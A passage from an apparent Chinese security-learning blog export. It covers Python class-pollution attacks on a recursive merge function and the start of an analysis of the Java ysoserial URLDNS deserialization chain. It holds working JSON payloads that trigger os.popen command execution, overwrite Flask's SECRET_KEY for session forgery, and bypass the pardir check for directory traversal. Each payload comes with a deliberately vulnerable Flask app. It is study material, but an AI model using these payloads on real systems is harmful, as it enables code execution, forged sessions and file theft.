<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; &quot;__init__&quot; : &#123;&quot;__globals__&quot; : &#123;&quot;evilFunc&quot; : &#123;&quot;__defaults__&quot; : (True , )&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个污染和上面的是一样的，同样的通过globals获得全局变量，然后找到evilFunc修改defaults 即默认参数的值为true。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714143724771.png"
                      alt="image-20230714143724771"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714143738589.png"
                      alt="image-20230714143738589"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714143814110.png"
                      alt="image-20230714143814110"
                ></p>
<p><strong>kwdefaults</strong></p>
<p><code>_kwdefaults__</code>以字典的形式按从左到右的顺序收录了函数键值形参的默认值</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def func_a(var_1, var_2 =2, var_3 = 3):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def func_b(var_1, /, var_2 =2, var_3 = 3):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def func_c(var_1, var_2 =2, *, var_3 = 3):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def func_d(var_1, /, var_2 =2, *, var_3 = 3):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">print(func_a.__kwdefaults__)</span><br><span class="line">print(func_b.__kwdefaults__)</span><br><span class="line">print(func_c.__kwdefaults__)</span><br><span class="line">print(func_d.__kwdefaults__)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714144010915.png"
                      alt="image-20230714144010915"
                ></p>
<p>可以看到kwdefaults是收录着函数的关键字参数的默认值</p>
<p>污染示例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def evilFunc(arg_1 , * , shell = False):</span><br><span class="line">    if not shell:</span><br><span class="line">        print(arg_1)</span><br><span class="line">    else:</span><br><span class="line">        print(__import__(&quot;os&quot;).popen(arg_1).read())</span><br><span class="line"></span><br><span class="line">class cls:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            &quot;evilFunc&quot; : &#123;</span><br><span class="line">                &quot;__kwdefaults__&quot; : &#123;</span><br><span class="line">                    &quot;shell&quot; : True</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">evilFunc(&quot;whoami&quot;)</span><br><span class="line">#whoami</span><br><span class="line">merge(payload, instance)</span><br><span class="line">evilFunc(&quot;whoami&quot;)</span><br><span class="line">#article-kelp</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714144304677.png"
                      alt="image-20230714144304677"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714144318889.png"
                      alt="image-20230714144318889"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714144333009.png"
                      alt="image-20230714144333009"
                ></p>
<h5 id="flask相关特定属性的相关利用"><a href="#flask相关特定属性的相关利用" class="headerlink" title="flask相关特定属性的相关利用"></a>flask相关特定属性的相关利用</h5><h6 id="secret-key伪造"><a href="#secret-key伪造" class="headerlink" title="secret_key伪造"></a>secret_key伪造</h6><p>我们可以通过污染去修改secret_key的值，然后进行任意session伪造</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#app.py</span><br><span class="line"></span><br><span class="line">from flask import Flask,request</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">class cls():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    if request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    return &quot;[+]Config:%s&quot;%(app.config[&#x27;SECRET_KEY&#x27;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=&quot;0.0.0.0&quot;)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714145412365.png"
                      alt="image-20230714145412365"
                ></p>
<p>这里因为并没有设置密钥所以为空</p>
<p>但是我们可以通过payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            &quot;app&quot; : &#123;</span><br><span class="line">                &quot;config&quot; : &#123;</span><br><span class="line">                    &quot;SECRET_KEY&quot; :&quot;Polluted~&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>去修改SECRET_KEY的值</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714145535300.png"
                      alt="image-20230714145535300"
                ></p>
<p>可以看到已经污染成功了</p>
<p>这里的污染思路和我们上面修改自定义属性和修改内置属性的方法是相同的，这也是原型链污染的一个应用吧。</p>
<h5 id="got-first-request"><a href="#got-first-request" class="headerlink" title="_got_first_request"></a>_got_first_request</h5><p>通常被用来判断某次请求是否为flask启动后的第一次请求，是是<code>Flask.got_first_request</code>函数的返回值</p>
<p>污染示例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask,request</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">class cls():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">flag = &quot;Is flag here?&quot;</span><br><span class="line"></span><br><span class="line">@app.before_first_request</span><br><span class="line">def init():</span><br><span class="line">    global flag</span><br><span class="line">    if hasattr(app, &quot;special&quot;) and app.special == &quot;U_Polluted_It&quot;:</span><br><span class="line">        flag = open(&quot;flag&quot;, &quot;rt&quot;).read()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    if request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    global flag</span><br><span class="line">    setattr(app, &quot;special&quot;, &quot;U_Polluted_It&quot;)</span><br><span class="line">    return flag</span><br><span class="line"></span><br><span class="line">app.run(host=&quot;0.0.0.0&quot;)</span><br></pre></td></tr></table></figure></div>

<p>通过分析代码我们可以知道只有程序启动后，<code>before_first_request</code>修饰的<code>init</code>函数只会在第一次访问前被调用，但是我们读取flag又需要访问路由&#x2F;才能够触发，这样就造成了相互矛盾，那也就是说我们访问&#x2F;要把<code>_got_first_request</code>属性值重置为假。这样才能够去调用before_first_request才会被调用</p>
<p>同样的通过globals获取全局变量然后找到_got_first_request修改其值为假</p>
<p>paylaod：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            &quot;app&quot; : &#123;</span><br><span class="line">                 &quot;_got_first_request&quot; : false           </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714151010859.png"
                      alt="image-20230714151010859"
                ></p>
<p>执行paylaod，修改属性值为假</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714151136578.png"
                      alt="image-20230714151136578"
                ></p>
<h5 id="static-url-path"><a href="#static-url-path" class="headerlink" title="_static_url_path"></a>_static_url_path</h5><p>在Flask框架中，<code>_static_url_path</code>是一个应用对象（<code>Flask</code>实例）的属性，用于设置静态文件的URL路径。</p>
<p><code>_static_url_path</code>属性用于设置静态文件的URL路径前缀。默认情况下，它的值为<code>/static</code>，这意味着静态文件可以通过类似<code>http://example.com/static/css/style.css</code>的URL路径进行访问</p>
<p>污染示例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#static/index.html</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h1&gt;hello&lt;/h1&gt;</span><br><span class="line">&lt;body&gt;    </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#app.py</span><br><span class="line"></span><br><span class="line">from flask import Flask,request</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">class cls():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    if request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    return &quot;flag in ./flag but heres only static/index.html&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=&quot;0.0.0.0&quot;)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714153747051.png"
                      alt="image-20230714153747051"
                ></p>
<p>尝试目录穿越</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714153803804.png"
                      alt="image-20230714153803804"
                ></p>
<p>通过污染修改属性值为当前目录</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714153923580.png"
                      alt="image-20230714153923580"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714153946310.png"
                      alt="image-20230714153946310"
                ></p>
<p>paylaod：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            &quot;app&quot; : &#123;               </span><br><span class="line">                    &quot;_static_folder : &quot;./&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<h5 id="os-path-pardir"><a href="#os-path-pardir" class="headerlink" title="os.path.pardir"></a>os.path.pardir</h5><p><code>os.path.pardir</code>是<code>os.path</code>模块中的一个常量，用于表示上一级目录的字符串。会影响flask模板渲染函数render_template的解析。</p>
<p>污染示例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#templates/index.html</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h1&gt;hello&lt;/h1&gt;</span><br><span class="line">&lt;body&gt;    </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#app.py</span><br><span class="line"></span><br><span class="line">from flask import Flask,request,render_template</span><br><span class="line">import json</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">class cls():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    if request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    return &quot;flag in ./flag but u just can use /file to vist ./templates/file&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&lt;path:path&gt;&quot;)</span><br><span class="line">def render_page(path):</span><br><span class="line">    if not os.path.exists(&quot;templates/&quot; + path):</span><br><span class="line">        return &quot;not found&quot;, 404</span><br><span class="line">    return render_template(path)</span><br><span class="line"></span><br><span class="line">app.run(host=&quot;0.0.0.0&quot;)</span><br></pre></td></tr></table></figure></div>

<p>直接访问<code>http://domain/xxx</code>时会使用<code>render_tempaltes</code>渲染<code>templates/xxx</code>文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714155140514.png"
                      alt="image-20230714155140514"
                ></p>
<p>尝试目录穿越，则会报服务器错误</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714155210221.png"
                      alt="image-20230714155210221"
                ></p>
<p>根据报错信息找到源码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714155319790.png"
                      alt="image-20230714155319790"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714155307031.png"
                      alt="image-20230714155307031"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714155432773.png"
                      alt="image-20230714155432773"
                ></p>
<p>继续跟进：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714155515849.png"
                      alt="image-20230714155515849"
                ></p>
<p>该函数接受一个名为<code>template</code>的字符串参数，表示模板路径。它首先通过<code>template.split(&quot;/&quot;)</code>将模板路径字符串分割成多个路径段，并使用<code>for</code>循环逐个处理这些段。</p>
<p>在每个段中，函数进行以下检查：</p>
<ul>
<li><code>os.path.sep in piece</code> 检查路径段中是否包含正常路径分隔符（例如，在Windows上是<code>\</code>）。</li>
<li><code>os.path.altsep and os.path.altsep in piece</code> 检查路径段中是否包含备用路径分隔符（例如，在Windows上是<code>/</code>）。</li>
<li><code>piece == os.path.pardir</code> 检查路径段是否等于<code>os.path.pardir</code>，即上一级目录表示符号<code>..</code>。</li>
</ul>
<p>如果上述任何一个条件为真，就会引发<code>TemplateNotFound</code>错误，表示模板路径不合法。</p>
<p>如果路径段不满足上述条件，且不为空或不等于当前目录表示符号<code>.</code>，则将其添加到<code>pieces</code>列表中。</p>
<p>最后，函数返回由合法路径段组成的<code>pieces</code>列表</p>
<p>那我们想要进行目录穿越就要避免触发34行的raise，os.path.pardir的值为..,所以我们只要修改为其他值就可以避免报错，从而实现render_template函数的目录穿越。</p>
<p>paylaod:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            &quot;os&quot; : &#123;</span><br><span class="line">               &quot;path&quot;:&#123;</span><br><span class="line">                    &quot;pardir&quot; : &quot;#&quot; </span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714160118834.png"
                      alt="image-20230714160118834"
                ></p>
<p>污染进行目录穿越</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714160148486.png"
                      alt="image-20230714160148486"
                ></p>
<p>本文到这里对python原型链污染的学习就结束了，再参考学习的文章中作者还写了再jinja中的应用，但是基本原理和前面差不多，只不过要对jinja的一些语法原理要有所了解，这里就没有进行复现。后期有机会了在去复现：<a class="link"   href="https://tttang.com/archive/1876/#toc_jinja_1" >https://tttang.com/archive/1876/#toc_jinja_1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>那么到这里对javascript和python的原型链污染的学习就结束了。</p>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>关于URLDNS利用链的学习</title>
    <url>/2023/07/15/URLDNS/</url>
    <content><![CDATA[<h2 id="JAVA-URLDNS利用链分析"><a href="#JAVA-URLDNS利用链分析" class="headerlink" title="JAVA URLDNS利用链分析"></a>JAVA URLDNS利用链分析</h2><h3 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h3><p>URLDNS是ysoserial项目中的一条利用链，这条利用链主要用来做验证反序列化漏洞是否存在。</p>
<p>URLDNS利用链有以下特点：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、利用链只能发起DNS请求，不能进行其他的利用</span><br><span class="line">2、不限制JDK版本，使用java内置类，对第三方依赖没有要求</span><br><span class="line">3、没有回显，所以可以通过DNS请求来验证反序列化漏洞是否存在</span><br></pre></td></tr></table></figure></div>

<p>利用URLDNS链验证反序列化漏洞存在的原理：</p>
<p>java.until.hashmap类实现了serializable接口，重写了read0bject方法,再反序列化时会调用hash函数计算key的hashcode，</p>
<p>java.net.URL的hashcode再计算时会调用<code>getHostAddress</code>来解析域名, 从而发出<code>DNS</code>请求。</p>
<p>那如何利用这个特点去验证是否存在反序列化漏洞？</p>
<p>我们可以构造一个恶意的序列华对象，序列化对象中包含一个恶意的URL地址，当目标将序列化对象进行反序列化时，会调用hash函数计算key的hashcode，然后java.net.URL的hashcode再计算时会调用<code>getHostAddress</code>来解析域名，解析之后回想我们定义的url地址发送请求，从而我们可以验证是否存在反序列化请求。</p>
<h3 id="二、URLDNS利用链分析"><a href="#二、URLDNS利用链分析" class="headerlink" title="二、URLDNS利用链分析"></a>二、URLDNS利用链分析</h3><p>在上面我们简单介绍了以下URLDNS链的作用和工作原理，下面我们通过ysoserial项目来相信分析以下利用链的实现过程。</p>
<p>项目地址：<a class="link"   href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial" >https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>我们先看一下URLDNS.java代码：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">            <span class="comment">//在创建有效负载时避免DNS解析</span></span><br><span class="line">            <span class="comment">//由于字段&lt;code&gt;java.net.URL.handler&lt;/code&gt;是暂态的，因此它不会成为序列化负载的一部分。</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230421173838312.png"
                      alt="image-20230421173838312"
                ></p>
<p>可以看到在这里实例化了一个Hashmap类</p>
<p>我们先了解以下hashmap类：</p>
<p>hashmap是一种常用的集合类，它实现了map接口，可以储存键值对。hashmap使用哈希表来实现，提供了快速的插入，删除和查找工作。</p>
<p>下面是hashmap常用的一些方法：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">put(key, value)：将指定的键值对存储到HashMap中，如果key已经存在，则会用新的value覆盖旧的value，返回值为旧的                  value或null。</span><br><span class="line">get(key)：返回指定键所映射的值，如果该键不存在，则返回null。</span><br><span class="line">remove(key)：从HashMap中移除指定的键值对，如果该键不存在，则不进行任何操作，返回值为被移除的value或null。</span><br><span class="line">size()：返回HashMap中键值对的数量。</span><br><span class="line">clear()：移除HashMap中的所有键值对。</span><br></pre></td></tr></table></figure></div>



<p>然后上面说实例化了一个HashMap类，这里因为Hashmap类重写了read0bject()方法。</p>
<p>跟进hashmap类的read0bject()方法（这里只给出主要部分）</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    ******</span><br><span class="line">        ******  </span><br><span class="line">        s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    ******</span><br><span class="line">        ******</span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span 